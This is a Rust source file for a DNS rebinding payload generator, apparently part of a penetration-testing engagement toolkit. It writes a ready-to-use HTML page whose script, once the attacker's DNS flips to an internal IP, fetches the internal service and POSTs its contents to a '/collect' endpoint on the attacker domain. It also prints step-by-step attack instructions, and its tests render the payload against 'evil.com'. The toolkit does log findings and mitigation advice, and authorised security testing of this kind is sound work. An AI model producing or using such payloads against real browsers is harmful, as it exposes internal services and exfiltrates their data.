/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-18
 * Description:     mg-dns-rebind — DNS rebinding payload generator.
 *                  Resolves target domain TTL, checks if target IP is
 *                  private, writes a ready-to-use rebinding HTML payload
 *                  and a JSON findings summary.
 * Notes:           The HTML payload assumes the attacker controls <domain>
 *                  and can set DNS to flip between attacker IP and target IP.
 *                  Works best when domain TTL <= 30s; warns if TTL is high.
 *******************************************************************/

use std::fs;
use std::net::IpAddr;
use std::path::Path;

use anyhow::{Context, Result};
use clap::Parser;
use hickory_resolver::Resolver;
use hickory_resolver::config::{ResolverConfig, ResolverOpts};
use hickory_resolver::net::runtime::TokioRuntimeProvider;
use serde::Serialize;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;

use engagement::{Engagement, FindingSeverity, ToolFinding, write_finding};

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "dns-rebind";
const AUDIT_TOOL: &str = "mg-dns-rebind";
const DEFAULT_PORT: u16 = 80;
const DEFAULT_TIMEOUT: u64 = 10;
// TTL threshold below which rebinding is considered highly feasible
const LOW_TTL_THRESHOLD_SECS: u64 = 60;
// Fallback TTL when resolution fails, in seconds
const FALLBACK_TTL_SECS: u64 = 300;

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(
    name = "mg-dns-rebind",
    about = "DNS rebinding payload generator — resolves TTL, checks target, writes HTML payload"
)]
struct Args {
    /// Engagement name
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// Internal IP to rebind to (the service behind the firewall)
    #[arg(long)]
    target: String,

    /// Attacker-controlled domain for rebinding
    #[arg(long)]
    domain: String,

    /// Port of the internal service
    #[arg(long, default_value_t = DEFAULT_PORT)]
    port: u16,

    /// DNS resolution timeout in seconds
    #[arg(long, default_value_t = DEFAULT_TIMEOUT)]
    timeout: u64,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Feasibility assessment for DNS rebinding
#[derive(Serialize)]
#[serde(rename_all = "snake_case")]
enum Feasibility {
    High,
    Medium,
    Low,
}

// Top-level output written to disk
#[derive(Serialize)]
struct RebindResults {
    engagement: String,
    target_ip: String,
    domain: String,
    port: u16,
    ttl_seconds: u64,
    target_is_private: bool,
    feasibility: Feasibility,
    feasibility_reason: String,
    payload_path: String,
    timestamp: String,
}

// ── Helpers ──────────────────────────────────────────────────────────────────

// Return current UTC timestamp as RFC 3339
fn now_rfc3339() -> String {
    OffsetDateTime::now_utc()
        .format(&Rfc3339)
        .unwrap_or_else(|_| "unknown".into())
}

// Sanitize timestamp for filename use (colons → underscores)
fn ts_for_filename(ts: &str) -> String {
    ts.chars().map(|c| if c == ':' { '_' } else { c }).collect()
}

// Return true if the address is in a private/loopback range
fn is_private_ip(addr: IpAddr) -> bool {
    match addr {
        IpAddr::V4(v4) => {
            let octets = v4.octets();
            // 10.0.0.0/8
            if octets[0] == 10 {
                return true;
            }
            // 172.16.0.0/12
            if octets[0] == 172 && (16..=31).contains(&octets[1]) {
                return true;
            }
            // 192.168.0.0/16
            if octets[0] == 192 && octets[1] == 168 {
                return true;
            }
            // 127.0.0.0/8
            if octets[0] == 127 {
                return true;
            }
            false
        }
        IpAddr::V6(v6) => v6.is_loopback(),
    }
}

// Resolve the A record TTL for the given domain; returns FALLBACK_TTL_SECS on error
async fn resolve_ttl(domain: &str, timeout_secs: u64) -> u64 {
    let mut opts = ResolverOpts::default();
    opts.timeout = std::time::Duration::from_secs(timeout_secs);
    let Ok(resolver) =
        Resolver::builder_with_config(ResolverConfig::default(), TokioRuntimeProvider::default())
            .with_options(opts)
            .build()
    else {
        return FALLBACK_TTL_SECS;
    };

    match resolver.lookup_ip(domain).await {
        Ok(lookup) => {
            // valid_until is a std::time::Instant; compute remaining duration
            let remaining = lookup
                .valid_until()
                .checked_duration_since(std::time::Instant::now());
            remaining.map(|d| d.as_secs()).unwrap_or(FALLBACK_TTL_SECS)
        }
        Err(e) => {
            eprintln!("  [WARN] DNS resolution failed for {domain}: {e} — using fallback TTL");
            FALLBACK_TTL_SECS
        }
    }
}

// Assess rebinding feasibility from TTL and private-IP flag
fn assess_feasibility(ttl_seconds: u64, target_is_private: bool) -> (Feasibility, String) {
    if !target_is_private {
        return (
            Feasibility::Low,
            format!(
                "target IP is not in a private range — rebinding typically targets internal services; \
                 unusual for external IP; TTL={ttl_seconds}s"
            ),
        );
    }
    if ttl_seconds <= LOW_TTL_THRESHOLD_SECS {
        (
            Feasibility::High,
            format!(
                "target is private and TTL={ttl_seconds}s (<= {LOW_TTL_THRESHOLD_SECS}s threshold) — \
                 rebinding highly feasible; victim browser will re-resolve after TTL expires"
            ),
        )
    } else {
        (
            Feasibility::Medium,
            format!(
                "target is private but TTL={ttl_seconds}s is high — rebinding possible but requires \
                 longer victim dwell time; consider reducing TTL on attacker domain"
            ),
        )
    }
}

// Render the HTML payload with the given parameters substituted
fn render_payload(domain: &str, port: u16, target_ip: &str, ttl_ms: u64) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>DNS Rebinding Payload</title></head>
<body>
<script>
// Phase 1: {domain} resolves to attacker IP (serves this page)
// Phase 2: after TTL expires, {domain} resolves to {target_ip}
// Browser same-origin policy now allows XHR to {domain}:{port} which hits the internal service
const TARGET = 'http://{domain}:{port}';
function exfil(data) {{
  fetch('https://{domain}/collect', {{method:'POST', body:JSON.stringify(data)}});
}}
function probe() {{
  fetch(TARGET + '/').then(r => r.text()).then(data => {{
    exfil({{url: TARGET + '/', data: data}});
  }}).catch(e => setTimeout(probe, 2000));
}}
setTimeout(probe, {ttl_ms});
</script>
</body>
</html>
"#
    )
}

// ── Entry point ──────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    // parse target IP — validate at boundary
    let target_addr: IpAddr = args
        .target
        .parse()
        .with_context(|| format!("parse --target as IP address: {}", args.target))?;

    let target_is_private = is_private_ip(target_addr);
    if !target_is_private {
        eprintln!(
            "  [WARN] --target {} is not a private IP — unusual for DNS rebinding",
            args.target
        );
    }

    eprintln!(
        "mg-dns-rebind: domain={} target={} port={}",
        args.domain, args.target, args.port
    );

    // resolve domain TTL
    eprintln!("  resolving TTL for {}", args.domain);
    let ttl_seconds = resolve_ttl(&args.domain, args.timeout).await;
    eprintln!("  TTL={ttl_seconds}s");

    let (feasibility, reason) = assess_feasibility(ttl_seconds, target_is_private);

    // write payload HTML
    let output_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&output_dir).context("create dns-rebind output dir")?;

    let payload_path = output_dir.join("payload.html");
    let ttl_ms = ttl_seconds.saturating_mul(1000);
    let html = render_payload(&args.domain, args.port, &args.target, ttl_ms);
    fs::write(&payload_path, &html).context("write payload.html")?;
    eprintln!("  payload written: {}", payload_path.display());

    let ts = now_rfc3339();
    let ts_file = ts_for_filename(&ts);

    let results = RebindResults {
        engagement: args.engagement.clone(),
        target_ip: args.target.clone(),
        domain: args.domain.clone(),
        port: args.port,
        ttl_seconds,
        target_is_private,
        feasibility,
        feasibility_reason: reason.clone(),
        payload_path: payload_path.display().to_string(),
        timestamp: ts.clone(),
    };

    let results_path = output_dir.join(format!("results-{ts_file}.json"));
    fs::write(
        &results_path,
        serde_json::to_string_pretty(&results).context("serialize results")?,
    )
    .context("write dns-rebind results JSON")?;

    eprintln!("mg-dns-rebind: written {}", results_path.display());
    eprintln!();
    eprintln!("Attack chain summary:");
    eprintln!("  1. Host payload.html at http://{}", args.domain);
    eprintln!("  2. Victim visits — browser caches DNS for {ttl_seconds}s");
    eprintln!(
        "  3. After TTL, update DNS: {} -> {}",
        args.domain, args.target
    );
    eprintln!(
        "  4. Browser re-resolves and XHR to {}:{} hits internal service",
        args.domain, args.port
    );
    eprintln!("  Feasibility: {reason}");

    // Emit MEDIUM finding when target is private and TTL is low enough to be exploitable
    if target_is_private && ttl_seconds <= LOW_TTL_THRESHOLD_SECS {
        let tf = ToolFinding::new(
            "mg-dns-rebind",
            "DNS Rebinding Attack Feasible",
            FindingSeverity::Medium,
        )
        .url(format!("http://{}:{}", args.domain, args.port))
        .evidence(format!(
            "target={} (private IP) domain={} port={} TTL={}s (<= {}s threshold)",
            args.target, args.domain, args.port, ttl_seconds, LOW_TTL_THRESHOLD_SECS
        ))
        .recommendation(
            "Increase DNS TTL above 60s; use CORS to restrict cross-origin XHR; \
                 deploy DNS rebinding protection at the browser or server level",
        );
        let _ = write_finding(&eng, &tf);
    }

    let _ = eng.audit(
        AUDIT_TOOL,
        &eng.meta.target,
        Some(&format!(
            "domain={} target={} port={} ttl_seconds={ttl_seconds} private={target_is_private} ts={ts}",
            args.domain, args.target, args.port
        )),
    );

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn private_ip_detection_rfc1918() {
        assert!(is_private_ip("10.0.0.1".parse().unwrap()));
        assert!(is_private_ip("172.16.0.1".parse().unwrap()));
        assert!(is_private_ip("172.31.255.255".parse().unwrap()));
        assert!(is_private_ip("192.168.1.1".parse().unwrap()));
        assert!(is_private_ip("127.0.0.1".parse().unwrap()));
    }

    #[test]
    fn private_ip_detection_public_is_false() {
        assert!(!is_private_ip("8.8.8.8".parse().unwrap()));
        assert!(!is_private_ip("1.1.1.1".parse().unwrap()));
        assert!(!is_private_ip("172.32.0.1".parse().unwrap()));
    }

    #[test]
    fn feasibility_high_when_private_and_low_ttl() {
        let (f, reason) = assess_feasibility(30, true);
        assert!(matches!(f, Feasibility::High));
        assert!(reason.contains("highly feasible"));
    }

    #[test]
    fn feasibility_medium_when_private_and_high_ttl() {
        let (f, reason) = assess_feasibility(3600, true);
        assert!(matches!(f, Feasibility::Medium));
        assert!(reason.contains("longer victim dwell time"));
    }

    #[test]
    fn feasibility_low_when_not_private() {
        let (f, _) = assess_feasibility(10, false);
        assert!(matches!(f, Feasibility::Low));
    }

    #[test]
    fn render_payload_substitutes_all_fields() {
        let html = render_payload("evil.com", 8080, "192.168.1.1", 30000);
        assert!(html.contains("'http://evil.com:8080'"));
        assert!(html.contains("192.168.1.1"));
        assert!(html.contains("setTimeout(probe, 30000)"));
        assert!(html.contains("https://evil.com/collect"));
    }

    #[test]
    fn ts_for_filename_replaces_colons() {
        assert_eq!(
            ts_for_filename("2026-05-18T10:30:00Z"),
            "2026-05-18T10_30_00Z"
        );
    }
}
